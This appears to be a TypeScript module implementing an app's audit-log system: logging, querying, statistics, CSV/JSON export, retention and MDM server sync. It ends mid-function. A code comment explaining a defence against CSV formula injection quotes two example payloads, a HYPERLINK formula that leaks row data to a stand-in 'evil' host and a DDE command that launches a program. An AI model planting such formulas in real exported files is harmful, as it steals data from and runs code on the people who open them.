/**
 * enterprise/audit.ts — 审计日志系统
 * 
 * 功能:
 * - 操作审计记录
 * - 执行日志追踪
 * - 多维度查询
 * - 日志导出
 * 
 * 安全特性:
 * - 敏感信息脱敏
 * - 日志加密
 * - 防篡改
 * - 自动归档
 */

import { readStoreValue, writeStoreValueChecked } from "../amosStore";
import { currentAppVersion, resolveAuditIdentity } from "../buildIdentity";
import { logger } from "./logger";
import { mdmManager } from "./mdm";
import { localId } from "../localId";

// ============================================================================
// 类型定义
// ============================================================================

/** 审计事件类型 */
export type AuditEventType =
  // 快捷指令操作
  | "shortcut_create"
  | "shortcut_update"
  | "shortcut_delete"
  | "shortcut_execute"
  | "shortcut_execute_success"
  | "shortcut_execute_failure"
  | "shortcut_share"
  | "shortcut_export"
  | "shortcut_import"
  | "shortcut_duplicate"
  // 模板操作
  | "template_install"
  | "template_uninstall"
  | "template_update"
  | "template_sync"
  // MDM 操作
  | "mdm_enroll"
  | "mdm_unenroll"
  | "mdm_sync"
  | "mdm_policy_change"
  | "mdm_config_update"
  // 配置操作
  | "config_change"
  | "permission_change"
  | "setting_change"
  // 系统事件
  | "system_start"
  | "system_stop"
  | "error_occurred"
  | "warning_occurred";

/** 审计事件类别 */
export type AuditEventCategory = "execution" | "management" | "access" | "system" | "security";

/** 审计日志级别 */
export type AuditLogLevel = "debug" | "info" | "warning" | "error" | "critical";

/** 审计结果 */
export type AuditResult = "success" | "failure" | "warning" | "blocked";

/** 审计元数据 */
export interface AuditMetadata {
  // 环境信息
  ipAddress?: string;
  userAgent?: string;
  platform: string;
  appVersion: string;
  
  // 位置信息（如果有权限）
  location?: {
    latitude: number;
    longitude: number;
    accuracy: number;
  };
  
  // 设备信息
  deviceInfo?: {
    model: string;
    os: string;
    osVersion: string;
    screenResolution: string;
  };
  
  // 标签（用于分类和搜索）
  tags: string[];
  
  // 关联信息
  correlationId?: string;  // 关联多个相关日志
  parentLogId?: string;    // 父日志 ID
  
  // 自定义字段
  custom?: Record<string, unknown>;
}

/** 审计日志 */
export interface AuditLog {
  // 基本信息
  id: string;
  timestamp: number;
  level: AuditLogLevel;
  
  // 用户和组织
  userId: string;
  userName: string;
  userEmail?: string;
  deviceId: string;
  organizationId: string;
  
  // 事件信息
  eventType: AuditEventType;
  eventCategory: AuditEventCategory;
  eventDescription: string;
  
  // 操作对象
  resourceType?: "shortcut" | "template" | "config" | "policy";
  resourceId?: string;
  resourceName?: string;
  
  // 操作详情
  actionDetails: Record<string, unknown>;
  
  // 执行结果
  result: AuditResult;
  errorMessage?: string;
  errorStack?: string;
  duration?: number;  // 毫秒
  
  // 变更信息（用于记录配置变更）
  changesBefore?: Record<string, unknown>;
  changesAfter?: Record<string, unknown>;
  
  // 元数据
  metadata: AuditMetadata;
  
  // 同步状态
  synced: boolean;
  syncedAt?: number;
  
  // 签名（防篡改）
  signature?: string;
}

/** 审计日志查询条件 */
export interface AuditLogQuery {
  // 时间范围
  startTime?: number;
  endTime?: number;
  
  // 用户过滤
  userId?: string;
  userName?: string;
  organizationId?: string;
  
  // 事件过滤
  eventTypes?: AuditEventType[];
  eventCategories?: AuditEventCategory[];
  levels?: AuditLogLevel[];
  
  // 资源过滤
  resourceType?: string;
  resourceId?: string;
  
  // 结果过滤
  results?: AuditResult[];
  
  // 关键词搜索
  search?: string;
  
  // 标签过滤
  tags?: string[];
  
  // 分页
  limit?: number;
  offset?: number;
  
  // 排序
  sortBy?: "timestamp" | "level" | "result";
  sortOrder?: "asc" | "desc";
}

/** 审计统计 */
export interface AuditStatistics {
  totalLogs: number;
  successCount: number;
  failureCount: number;
  warningCount: number;
  blockedCount: number;
  
  // 按事件类型统计
  byEventType: Record<AuditEventType, number>;
  
  // 按类别统计
  byCategory: Record<AuditEventCategory, number>;
  
  // 按用户统计
  byUser: Record<string, number>;
  
  // 按时间统计（每小时）
  byHour: Array<{ hour: string; count: number }>;
  
  // 平均执行时间
  avgDuration: number;
  maxDuration: number;
  minDuration: number;
}

/** 审计配置 */
export interface AuditConfig {
  enabled: boolean;
  
  // 日志级别（只记录此级别及以上）
  minLevel: AuditLogLevel;
  
  // 保留策略
  retentionDays: number;          // 本地保留天数
  autoArchive: boolean;           // 自动归档
  archiveAfterDays: number;       // 多少天后归档
  
  // 同步配置
  syncEnabled: boolean;
  syncInterval: number;           // 同步间隔（秒）
  syncBatchSize: number;          // 每批同步数量
  
  // 敏感信息脱敏
  maskSensitiveData: boolean;
  sensitiveFields: string[];      // 需要脱敏的字段
  
  // 性能优化
  bufferSize: number;             // 缓冲区大小
  flushInterval: number;          // 刷新间隔（秒）
  
  // 签名验证
  enableSignature: boolean;
  signatureKey?: string;
}

// ============================================================================
// 常量
// ============================================================================

export const AUDIT_LOGS_KEY = "amos.shortcuts.audit.logs";
export const AUDIT_CONFIG_KEY = "amos.shortcuts.audit.config";
export const AUDIT_SYNC_QUEUE_KEY = "amos.shortcuts.audit.sync_queue";

const STORE_KEYS = {
  AUDIT_LOGS: AUDIT_LOGS_KEY,
  AUDIT_CONFIG: AUDIT_CONFIG_KEY,
  AUDIT_SYNC_QUEUE: AUDIT_SYNC_QUEUE_KEY,
};

const DEFAULT_CONFIG: AuditConfig = {
  enabled: true,
  minLevel: "info",
  retentionDays: 90,
  autoArchive: true,
  archiveAfterDays: 30,
  syncEnabled: true,
  syncInterval: 300,  // 5 分钟
  syncBatchSize: 100,
  maskSensitiveData: true,
  sensitiveFields: ["password", "token", "apiKey", "secret", "credential"],
  bufferSize: 1000,
  flushInterval: 30,  // 30 秒
  enableSignature: true,
};

const LOG_LEVEL_PRIORITY: Record<AuditLogLevel, number> = {
  debug: 0,
  info: 1,
  warning: 2,
  error: 3,
  critical: 4,
};

/**
 * Result ordinals — ascending severity, the **same convention** `LOG_LEVEL_PRIORITY`
 * states for the sibling `sortBy: "level"` dimension (REQ-A1542 ∕ F-SH-782).
 *
 * `sortBy` declares three dimensions; the comparator branched on only two. With
 * `"result"` every pair compared `0`, so `sort` returned the input order and the
 * caller's requested order was **silently discarded** — a query that claims to be
 * sorted by outcome and isn't is the same class of lie as a `0` standing in for a
 * value nobody read. Success is benign (0) and blocked is the most severe (3); the
 * order is a policy this module states, not one inferred from the data.
 */
const RESULT_PRIORITY: Record<AuditResult, number> = {
  success: 0,
  warning: 1,
  failure: 2,
  blocked: 3,
};

/**
 * Narrow a value read from {@link AUDIT_LOGS_KEY} to a list of log rows.
 *
 * This key is a **`SYNC_STORES` member**, and `restoreStores` writes a backup's
 * value for it back **verbatim, with no shape check** — so a restore can legally
 * put anything here. That collides with this key's on-disk format: `saveLogs`
 * stringifies (and `writeStoreValueChecked` stringifies again), so the store holds
 * a *double-encoded* array and `readStoreValue` hands back the inner JSON **string**.
 * `loadLogs` then applied a **second** `JSON.parse` to whatever it got, which only
 * works for that one shape. Two ways it broke, both reachable from a restore:
 *
 *  * a blob carrying the rows as a real array → `JSON.parse(["…"])` stringifies its
 *    argument (`"[object Object]"`) and throws → the restored logs were silently
 *    dropped: 「恢复成功」, and the audit history was empty.
 *  * a blob carrying the key as a JSON *string* that is not an array (`"{}"`, `"5"`)
 *    → `this.logs` became that non-array, and `bootstrap()`'s
 *    `cleanupExpiredLogs` (`this.logs.filter`) threw. `AuditLogViewer` calls
 *    `getStatistics` in a `$derived` that runs on render, so the viewer could not
 *    open at all.
 *
 * Accept **both** forms (the string this class writes, and an already-decoded
 * array a restore delivers) and fall back to "no logs" for anything else. A
 * non-terminal junk row is dropped for the same reason: every reader assumes rows.
 * Nothing is written back — this is a read-side narrowing, never a repair.
 */
function normalizeAuditLogs(raw: unknown): AuditLog[] {
  let v: unknown = raw;
  if (typeof v === "string") {
    try {
      v = JSON.parse(v);
    } catch {
      return [];
    }
  }
  if (!Array.isArray(v)) return [];
  return v.filter((r): r is AuditLog => typeof r === "object" && r !== null);
}

/**
 * Render one CSV cell. **Two independent rules, in this order.**
 *
 * 1. **Formula injection** (OWASP "CSV Injection"). Excel, LibreOffice and Sheets evaluate a
 *    cell whose **first** character is `=` `+` `-` `@` — a leading tab or CR does the same —
 *    so a free-text field becomes a live formula the moment the exported file is opened:
 *    `=HYPERLINK("http://evil/?"&A1,"x")` lifts the row out, and the classic
 *    `=cmd|'/C calc'!A0` (DDE) runs a program. RFC 4180 quoting does **not** stop this — the
 *    spreadsheet strips the quotes and evaluates the field — so the only honest defusal is a
 *    leading `'`, which every spreadsheet reads as "the rest is text" and hides.
 *
 *    This is reachable, not theoretical. `resourceName` is the **raw** shortcut name
 *    (`validateShortcutName` checks only non-empty ∕ length) and `errorMessage` is an
 *    arbitrary error string; neither carries a prefix. `eventDescription` happens to start
 *    with 「执行快捷指令: 」, which is exactly why the *resource* column, not the description,
 *    is the live vector — a name that a bare `eventDescription` check would have cleared.
 *
 * 2. **RFC 4180 §2**: a field carrying the delimiter, a double quote or a line break is
 *    wrapped in quotes with its inner quotes doubled; anything else stays bare.
 *
 * `exportLogs`' CSV branch used to `row.join(",")` every field as-is. But `eventDescription`
 * is **free text** — `logExecution` writes `执行快捷指令: ${shortcutName}` — and
 * `errorMessage` is an arbitrary error string, so:
 *
 *  * a comma in a shortcut's name added a column, shifting every field after it onto its
 *    neighbour — the exported record credited one row's `success` to another row's result;
 *  * a newline split one record into two lines (and a reader counting lines saw extra rows);
 *  * a double quote truncated the text at the quote.
 *
 * The JSON branch beside it (`JSON.stringify(logs, null, 2)`) was always intact — same
 * method, same export menu — which is what marked the CSV path as the odd one out rather
 * than a format nobody depends on. This is the one rule; headers and cells both go through it.
 *
 * Honest boundary: for a cell that *does* start with a trigger character the exported bytes
 * differ from the stored value by that leading `'`. A spreadsheet renders the original text;
 * a reader that does not understand the convention will show the apostrophe. There is no
 * lossless alternative for a CSV a spreadsheet will evaluate — the choice is between an
 * altered cell and an executable one.
 */
function csvField(value: unknown): string {
  const s = value == null ? "" : String(value);
  const guarded = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

/**
 * Render a row's timestamp as an ISO-8601 cell, or `""` when it is not a usable date.
 *
 * A row is only as good as the store it came from, and this key is a `SYNC_STORES` member:
 * `restoreStores` writes a backup's value back verbatim, and `normalizeAuditLogs` (the
 * reader's narrowing) admits any object row by design — it does **not** require a timestamp.
 * So a legal restore can put a row in front of the exporter whose `timestamp` is missing,
 * a string, `NaN`, or out of the Date range. `new Date(log.timestamp).toISOString()` threw
 * `RangeError: Invalid time value` on every one of those and took the **whole export** with
 * it — a failed CSV file nobody could explain. The sibling branches never throw: the JSON
 * branch stringifies the row as-is, and the viewer's own `formatTimestamp` draws the empty
 * date rather than claiming one. This cell must agree with them: no date is `""` (「没有
 * 记录到时刻」), never a fabricated epoch.
 */
function csvTimestamp(value: unknown): string {
  if (typeof value !== "number" || !Number.isFinite(value)) return "";
  const d = new Date(value);
  return Number.isNaN(d.getTime()) ? "" : d.toISOString();
}

// ============================================================================
// 审计日志管理器
// ============================================================================

export class AuditLogger {
  private config: AuditConfig = DEFAULT_CONFIG;
  private logs: AuditLog[] = [];
  private buffer: AuditLog[] = [];
  private syncQueue: string[] = [];
  private flushTimer: ReturnType<typeof setInterval> | null = null;
  private syncTimer: ReturnType<typeof setInterval> | null = null;
  /** `ensureInitialized()` 是否已经跑过（见那里为什么读写路径要自己把它叫起来）。 */
  private initialized = false;
  /** 是否有人**显式**选过配置（`updateConfig`）。见 `loadConfig()` 的第一条判据。 */
  private configChosen = false;

  /**
   * 引导流水线，**幂等**，而且由使用者自己触发（REQ-A897）。
   *
   * 为什么不能只依赖 `initialize()`：它只被 `enterprise/index.ts` 的
   * `initializeEnterprise()` 调用，而后者在生产里**零调用者** —— 于是这一整套
   * 「读配置 / 读回已落盘的日志 / 起刷新定时器」从来没有在设备上发生过：
   * 上一次会话写进存储的审计日志，重启后没有任何人读回来；而把缓冲区搬进
   * `logs` 的唯一**定时**路径（`startFlushTimer`）也从未启动。
   *
   * 所以把「我准备好了」这句话系在**真正需要它的那两个动作**上：写一条
   * （`log()`）和读一次（`query()` / `getStatistics()`）。任何一条被用到，
   * 流水线就先自己站起来。`initialized` 在**任何 await / 重入之前**置位 ——
   * `initialize()` 自己会调 `log()`，没有这个顺序就是无限递归。
   */
  private ensureInitialized(): void {
    if (this.initialized) return;
    this.initialized = true;
    this.bootstrap();
    // **没有**在这里补一条「本会话起点」。这件事是本轮刻意留下的（REQ-A982 / F-SH-309 的
    // 边界段）：`system_start` / `system_stop` 这对标记仍然只有 `initialize()` / `shutdown()`
    // 会写，而这两条路径在生产里都没有调用者。补法有两条，都不是在这里悄悄加一行：
    // ①挂在一个真实的启动钩子上（本仓当前没有这样的钩子，`initializeEnterprise()` 就是那个
    // 不存在的钩子的替身）；②在这里惰性发一条 —— 那会让「系统启动」这句话出现在**用户第一次
    // 打开审计查看器**的时刻，一条 Audit 轨里的假启动时刻比没有起点更坏。
  }

  /**
   * 「装载 + 保留期 + 起定时器」这一份，只有这一处（`initialize()` 与 `ensureInitialized()`
   * 共用；两份字节相同的引导正是 REQ-A897 在修的形状）。
   */
  private bootstrap(): void {
    this.loadConfig();
    this.loadLogs();
    this.loadSyncQueue();
    // 保留期在**这里**生效，不再在 `initialize()` 里（REQ-A982 / F-SH-309）：`initialize()`
    // 的唯一调用者 `initializeEnterprise()` 在生产里零调用者，于是 `retentionDays` 是一个
    // **存了、也配了、却从来没人执行**的上限 —— 审计行只增不减地留在存储里。
    this.cleanupExpiredLogs();
    if (this.config.enabled) {
      this.startFlushTimer();
      if (this.config.syncEnabled && mdmManager.isEnabled()) {
        this.startSyncTimer();
      }
    }
  }

  /**
   * 初始化审计日志系统
   *
   * 语义与从前一致（每次都重新装载、每次都记 `system_start`），只是**定时器不再叠加**
   * —— 从前重复调用会把上一只 `setInterval` 的句柄覆盖掉，那只定时器再也没人能停
   * （REQ-A385 的形状），所以在 `startFlushTimer()` 里先清旧的。
   */
  async initialize(): Promise<void> {
    // 显式初始化 = 「采纳存储里那一份」，与从前一致（也是测试隔离依赖的语义）。
    this.configChosen = false;
    this.bootstrap();
    this.initialized = true;

    if (this.config.enabled) {
      // 保留期不在这里单独跑了：它在 `bootstrap()` 里，`initialize()` 与
      // `ensureInitialized()` 共用那一份（REQ-A982 / F-SH-309）。

      // 记录系统启动
      await this.log({
        eventType: "system_start",
        eventCategory: "system",
        eventDescription: "审计日志系统启动",
        result: "success",
      });
    }
  }

  /**
   * 记录审计日志
   */
  async log(params: {
    eventType: AuditEventType;
    eventCategory: AuditEventCategory;
    eventDescription: string;
    level?: AuditLogLevel;
    result?: AuditResult;
    resourceType?: "shortcut" | "template" | "config" | "policy";
    resourceId?: string;
    resourceName?: string;
    actionDetails?: Record<string, unknown>;
    errorMessage?: string;
    errorStack?: string;
    duration?: number;
    changesBefore?: Record<string, unknown>;
    changesAfter?: Record<string, unknown>;
    tags?: string[];
    custom?: Record<string, unknown>;
  }): Promise<string> {
    // 写之前先把流水线叫起来：`config` 必须是**读过存储的那一份**，否则 `enabled`
    // 与 `minLevel` 判的都是编译期默认值，而存储里那份配置从未生效（REQ-A897）。
    this.ensureInitialized();
    if (!this.config.enabled) {
      return "";
    }

    const level = params.level || this.inferLevel(params.eventType, params.result);
    
    // 检查日志级别
    if (LOG_LEVEL_PRIORITY[level] < LOG_LEVEL_PRIORITY[this.config.minLevel]) {
      return "";
    }

    // 生成日志
    const log: AuditLog = {
      id: this.generateLogId(),
      timestamp: Date.now(),
      level,
      userId: this.getCurrentUserId(),
      userName: this.getCurrentUserName(),
      userEmail: this.getCurrentUserEmail(),
      deviceId: this.getDeviceId(),
      organizationId: this.getOrganizationId(),
      eventType: params.eventType,
      eventCategory: params.eventCategory,
      eventDescription: params.eventDescription,
      resourceType: params.resourceType,
      resourceId: params.resourceId,
      resourceName: params.resourceName,
      actionDetails: this.maskSensitiveData(params.actionDetails || {}),
      result: params.result || "success",
      errorMessage: params.errorMessage,
      errorStack: params.errorStack,
      duration: params.duration,
      changesBefore: params.changesBefore,
      changesAfter: params.changesAfter,
      metadata: this.collectMetadata(params.tags, params.custom),
      synced: false,
    };

    // 签名
    if (this.config.enableSignature) {
      log.signature = this.signLog(log);
    }

    // 添加到缓冲区
    this.buffer.push(log);

    // 如果缓冲区满了，立即刷新
    if (this.buffer.length >= this.config.bufferSize) {
      // 落到**公开那一个** `flushBuffer()`（REQ-A897）：原来这里调的是私有 `flush()`，
      // 于是「测试钉住的那份实现」和「生产跑的那份实现」是两份字节相同的代码 ——
      // 改一份不会让另一份红。现在只有一份，测试碰到的就是生产跑的。
      await this.flushBuffer();
    }

    return log.id;
  }

  /**
   * 记录快捷指令执行
   */
  async logExecution(params: {
    shortcutId: string;
    shortcutName: string;
    success: boolean;
    duration: number;
    errorMessage?: string;
    actionCount: number;
  }): Promise<void> {
    await this.log({
      eventType: params.success ? "shortcut_execute_success" : "shortcut_execute_failure",
      eventCategory: "execution",
      eventDescription: `执行快捷指令: ${params.shortcutName}`,
      level: params.success ? "info" : "error",
      result: params.success ? "success" : "failure",
      resourceType: "shortcut",
      resourceId: params.shortcutId,
      resourceName: params.shortcutName,
      actionDetails: {
        actionCount: params.actionCount,
      },
      errorMessage: params.errorMessage,
      duration: params.duration,
      tags: ["execution", params.success ? "success" : "failure"],
    });
  }

  /**
   * 一条审计日志**写下来之后就该能被读到**（REQ-A897）：`logs` 与 `buffer` 的并集。
   *
   * 缓冲区是**为落盘的批量**而存在的，不是为了对读者隐藏。原来的读者只看 `this.logs`，
   * 而搬动 buffer→logs 的只有两条路：缓冲区满（默认 1000 条），和只在 `initialize()`
   * 里启动的刷新定时器 —— 后者在生产里从没启动过。于是审计查看器（`AuditLogViewer`
   * 是挂载着的界面）在正常情况下**一行都看不到**，直到攒满 1000 条才整批跳出来；
   * 而 `flushBuffer()` 这个公开的刷新口，生产里零调用者，只有测试在调它 ——
   * 测试自己补上了生产从不做的那一步，所以测试一直是绿的。
   *
   * 并集不会重复计数：`flushBuffer()` 是**移动**（push 之后清空 buffer），不是拷贝。
   */
  private allLogs(): AuditLog[] {
    return this.buffer.length === 0 ? this.logs : [...this.logs, ...this.buffer];
  }

  /**
   * Apply every filter dimension of an {@link AuditLogQuery} — **the one rule** the reader
   * (`query`), the exporter (`exportLogs`) and the statistics (`getStatistics`) all share.
   *
   * No sort and no pagination here: those belong to the reader. Statistics must aggregate the
   * *whole* matching set while the reader caps what it draws, so the two cannot be the same call
   * — but they must agree on **what matched**.
   */
  private filterLogs(params: AuditLogQuery): AuditLog[] {
    let results = [...this.allLogs()];

    // 时间过滤
    if (params.startTime) {
      results = results.filter(log => log.timestamp >= params.startTime!);
    }
    if (params.endTime) {
      results = results.filter(log => log.timestamp <= params.endTime!);
    }

    // 用户过滤
    if (params.userId) {
      results = results.filter(log => log.userId === params.userId);
    }
    if (params.userName) {
      results = results.filter(log => 
        log.userName.toLowerCase().includes(params.userName!.toLowerCase())
      );
    }
    if (params.organizationId) {
      results = results.filter(log => log.organizationId === params.organizationId);
    }

    // 事件过滤
    if (params.eventTypes && params.eventTypes.length > 0) {
      results = results.filter(log => params.eventTypes!.includes(log.eventType));
    }
    if (params.eventCategories && params.eventCategories.length > 0) {
      results = results.filter(log => params.eventCategories!.includes(log.eventCategory));
    }
    if (params.levels && params.levels.length > 0) {
      results = results.filter(log => params.levels!.includes(log.level));
    }

    // 资源过滤
    if (params.resourceType) {
      results = results.filter(log => log.resourceType === params.resourceType);
    }
    if (params.resourceId) {
      results = results.filter(log => log.resourceId === params.resourceId);
    }

    // 结果过滤
    if (params.results && params.results.length > 0) {
      results = results.filter(log => params.results!.includes(log.result));
    }

    // 关键词搜索
    if (params.search) {
      const search = params.search.toLowerCase();
      results = results.filter(
        log =>
          log.eventDescription.toLowerCase().includes(search) ||
          log.resourceName?.toLowerCase().includes(search) ||
          log.errorMessage?.toLowerCase().includes(search)
      );
    }

    // 标签过滤
    if (params.tags && params.tags.length > 0) {
      results = results.filter(log =>
        params.tags!.some(tag => log.metadata.tags.includes(tag))
      );
    }

    return results;
  }

  /**
   * 排序后的**整个匹配集** —— 分页之前的那一份（REQ-A1514 ∕ F-SH-759）。
   *
   * `query()` 在它之上切一页（默认 100 条），`exportLogs()` 要的却是整份：导出的是一张审计
   * 凭据，**静默地只写第一页等于丢数据**。修前 `exportLogs` 的第一行逐字是
   * `const logs = this.query(query);`，于是导出和读者一样吃那条默认上限 —— 屏幕上的
   * 「总计 N」数的是整个匹配集，写出去的文件却只到 100 条，谁也没说。
   */
  private matchedSorted(params: AuditLogQuery): AuditLog[] {
    const results = this.filterLogs(params);

    // 排序
    const sortBy = params.sortBy || "timestamp";
    const sortOrder = params.sortOrder || "desc";
    results.sort((a, b) => {
      let comparison = 0;
      if (sortBy === "timestamp") {
        comparison = a.timestamp - b.timestamp;
      } else if (sortBy === "level") {
        comparison = LOG_LEVEL_PRIORITY[a.level] - LOG_LEVEL_PRIORITY[b.level];
      } else if (sortBy === "result") {
        comparison = RESULT_PRIORITY[a.result] - RESULT_PRIORITY[b.result];
      }
      return sortOrder === "asc" ? comparison : -comparison;
    });

    return results;
  }

  /**
   * 查询审计日志 —— 匹配集之上切**一页**（默认 100 条）。调用方要整份时传 `limit`。
   */
  query(params: AuditLogQuery = {}): AuditLog[] {
    this.ensureInitialized();
    const results = this.matchedSorted(params);

    // 分页
    const offset = params.offset || 0;
    const limit = params.limit || 100;
    return results.slice(offset, offset + limit);
  }

  /**
   * 获取统计信息 — **按查看器正在显示的那份查询**（REQ-A1495 ∕ F-SH-736）。
   *
   * 修前它只收时间窗（`getStatistics(startTime?, endTime?)`），于是统计卡统计的是另一个集合：
   * 界面把「结果」筛成「失败」之后，列表只剩失败行，而正上方的统计卡照旧印着这个时间窗里的
   * **成功**条数 —— 列表刚刚剔除掉的那些行 —— 列表标题却在数失败。同一个屏幕两个数。
   *
   * 查看器那份 `query` 的三个消费者里，列表（`query`）与导出（`exportLogs`）都传整个对象，
   * 只有统计传了两个数字 —— 这就是那条被漏掉的规则。现在三者走同一条 {@link filterLogs}。
   */
  getStatistics(params: AuditLogQuery = {}): AuditStatistics {
    this.ensureInitialized();
    const logs = this.filterLogs(params);

    const stats: AuditStatistics = {
      totalLogs: logs.length,
      successCount: logs.filter(l => l.result === "success").length,
      failureCount: logs.filter(l => l.result === "failure").length,
      warningCount: logs.filter(l => l.result === "warning").length,
      blockedCount: logs.filter(l => l.result === "blocked").length,
      byEventType: {} as Record<AuditEventType, number>,
      byCategory: {} as Record<AuditEventCategory, number>,
      byUser: {},
      byHour: [],
      avgDuration: 0,
      maxDuration: 0,
      minDuration: 0,
    };

    // 按事件类型统计
    logs.forEach(log => {
      stats.byEventType[log.eventType] = (stats.byEventType[log.eventType] || 0) + 1;
      stats.byCategory[log.eventCategory] = (stats.byCategory[log.eventCategory] || 0) + 1;
      stats.byUser[log.userName] = (stats.byUser[log.userName] || 0) + 1;
    });

    // 执行时间统计
    const logsWithDuration = logs.filter(l => l.duration !== undefined);
    if (logsWithDuration.length > 0) {
      const durations = logsWithDuration.map(l => l.duration!);
      stats.avgDuration = durations.reduce((sum, d) => sum + d, 0) / durations.length;
      stats.maxDuration = Math.max(...durations);
      stats.minDuration = Math.min(...durations);
    }

    return stats;
  }

  /**
   * 导出日志 — **整个匹配集**，不分页（REQ-A1514 ∕ F-SH-759）。
   *
   * 修前走的是 `this.query(query)`，于是导出和列表一样只到默认的 100 条：一份审计凭据
   * 静默地少了第 101 条之后的全部行。筛选条件仍然照旧生效 —— 少的只是那条谁都没看见的上限。
   */
  async exportLogs(
    query: AuditLogQuery = {},
    format: "json" | "csv" = "json"
  ): Promise<string> {
    this.ensureInitialized();
    const logs = this.matchedSorted(query);

    if (format === "json") {
      return JSON.stringify(logs, null, 2);
    }

    // CSV 格式
    const headers = [
      "时间",
      "级别",
      "用户",
      "事件类型",
      "事件描述",
      "资源",
      "结果",
      "错误信息",
      "执行时间(ms)",
    ];

    const rows = logs.map(log => [
      csvTimestamp(log.timestamp),
      log.level,
      log.userName,
      log.eventType,
      log.eventDescription,
      log.resourceName || "",
      log.result,
      log.errorMessage || "",
      log.duration?.toString() || "",
    ]);

    // Every cell — header included — goes through the one quoting rule (RFC 4180). A bare
    // `row.join(",")` let a comma inside a description shift the columns after it.
    const csv = [headers, ...rows]
      .map((row) => row.map(csvField).join(","))
      .join("\n");
    return csv;
  }

  /**
   * 刷新缓冲区：把 `buffer` **移动**进 `logs`（并进同步队列、落盘）。
   *
   * 这是唯一一份刷新实现（REQ-A897）。原来它旁边还有一份字节相同的私有 `flush()`
   * —— 生产的三条路径（写满、定时器、关闭）调的都是**私有那份**，而公开这份只有
   * 测试在调；两份实现意味着「测试钉住的」和「设备上跑的」可以各自漂移。
   */
  async flushBuffer(): Promise<void> {
    if (this.buffer.length === 0) return;

    // 移动到主日志数组
    this.logs.push(...this.buffer);

    // 添加到同步队列
    this.syncQueue.push(...this.buffer.map(log => log.id));

    // 清空缓冲区
    this.buffer = [];

    // 保存（即使失败也不影响内存中的日志）
    this.saveLogs();
    this.saveSyncQueue();
  }

  /**
   * 同步到服务器
   */
  private async syncToServer(): Promise<void> {
    if (this.syncQueue.length === 0) return;

    const mdmConfig = mdmManager.getConfig();
    if (!mdmConfig) return;

    try {
      const batch = this.syncQueue.slice(0, this.config.syncBatchSize);
      const logsToSync = this.logs.filter(log => batch.includes(log.id));

      const response = await fetch(`${mdmConfig.serverUrl}/api/audit/sync`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${mdmConfig.apiKey}`,
        },
        body: JSON.stringify({
          deviceId: mdmConfig.deviceId,
          logs: logsToSync,
        }),
      });

      const data = await response.json();
      if (data.success) {
        // 标记为已同步
        logsToSync.forEach(log => {
          log.synced = true;
          log.syncedAt = Date.now();
        });

        // 从同步队列移除
        this.syncQueue = this.syncQueue.filter(id => !batch.includes(id));
        
        this.saveLogs();
        this.saveSyncQueue();
      }
    } catch (err) {
      console.error("[Audit] 同步失败:", err);
    }
  }

  /**
   * 清理过期日志。
   *
   * **同步的**（体内一个 `await` 也没有），因为它现在挂在同步的 `bootstrap()` 上，而生产入口
   * `query()` / `getStatistics()` 都是同步的 —— 从前的 `async` 签名正是它只能被 `initialize()`
   * 叫到的原因之一（REQ-A982 / F-SH-309）。
   *
   * 只删**已同步**的过期行：一条还没上云的审计条目被本地删掉就是永久丢失，这是本模块一贯的
   * 方向（宁可留着，不可丢）。代价写进 F-SH-309 的边界段：一台没有 MDM 服务器的设备，保留期
   * 仍然管不住这份存储 —— 那条策略本轮**不**动。
   */
  private cleanupExpiredLogs(): void {
    const cutoffTime = Date.now() - this.config.retentionDays * 24 * 60 * 60 * 1000;
    const kept = this.logs.filter((log) => !(log.timestamp < cutoffTime && log.synced));
    // 一行都没删就不重写存储：引导每次启动都跑，一次空写既是多余的 I/O，也会在配额紧张时
    // 把别的键挤出去（`writeStoreValueChecked` 的失败正是别的键先被牺牲的那种）。
    if (kept.length === this.logs.length) return;
    this.logs = kept;
    this.saveLogs();
  }

  /**
   * 启动刷新定时器
   */
  private startFlushTimer(): void {
    if (typeof globalThis.setInterval !== "function") {
      logger.warn("audit", "setInterval not available, skipping flush timer");
      return;
    }
    // 先清旧的：重复 bootstrap/initialize 时旧句柄会被覆盖，那只定时器就再也没人
    // 能停掉了（REQ-A385 的 lifetime 判据）。
    if (this.flushTimer) globalThis.clearInterval(this.flushTimer);
    this.flushTimer = globalThis.setInterval(() => {
      this.flushBuffer().catch(err => {
        console.error("[Audit] 刷新失败:", err);
      });
    }, this.config.flushInterval * 1000);
  }

  /**
   * 启动同步定时器
   */
  private startSyncTimer(): void {
    if (typeof globalThis.setInterval !== "function") {
      logger.warn("audit", "setInterval not available, skipping sync timer");
      return;
    }
    if (this.syncTimer) globalThis.clearInterval(this.syncTimer);
    this.syncTimer = globalThis.setInterval(() => {
      this.syncToServer().catch(err => {
        console.error("[Audit] 同步失败:", err);
      });
    }, this.config.syncInterval * 1000);
  }

  /**
   * 停止定时器
   */
  async shutdown(): Promise<void> {
    if (this.flushTimer) {
      globalThis.clearInterval(this.flushTimer);
      this.flushTimer = null;
    }
    if (this.syncTimer) {
      globalThis.clearInterval(this.syncTimer);
      this.syncTimer = null;
    }

    // 最后刷新一次
    await this.flushBuffer();

    // 记录系统停止
    await this.log({
      eventType: "system_stop",
      eventCategory: "system",
      eventDescription: "审计日志系统关闭",
      result: "success",
    });
  }


  /**
   * 推断日志级别
   */
  private inferLevel(eventType: AuditEventType, result?: AuditResult): AuditLogLevel {
    if (result === "blocked") return "warning";
    if (result === "failure") return "error";
    
    if (eventType.includes("error")) return "error";
    if (eventType.includes("warning")) return "warning";
    if (eventType.includes("failure")) return "error";
    
    return "info";
  }

  /**
   * 收集元数据
   */
  private collectMetadata(tags?: string[], custom?: Record<string, unknown>): AuditMetadata {
    return {
      platform: navigator.platform,
      appVersion: this.getAppVersion(),
      userAgent: navigator.userAgent,
      tags: tags || [],
      custom,
    };
  }

  /**
   * 脱敏敏感数据
   */
  private maskSensitiveData(data: Record<string, unknown>): Record<string, unknown> {
    if (!this.config.maskSensitiveData) return data;

    const masked: Record<string, unknown> = {};
    
    for (const [key, value] of Object.entries(data)) {
      if (this.config.sensitiveFields.some(field => 
        key.toLowerCase().includes(field.toLowerCase())
      )) {
        masked[key] = "***MASKED***";
      } else if (typeof value === "object" && value !== null) {
        masked[key] = this.maskSensitiveData(value as Record<string, unknown>);
      } else {
        masked[key] = value;
      }
    }

    return masked;
  }

  /**
   * 签名日志（防篡改）
   */
  private signLog(log: AuditLog): string {
    if (!this.config.signatureKey) {
      return "";
    }

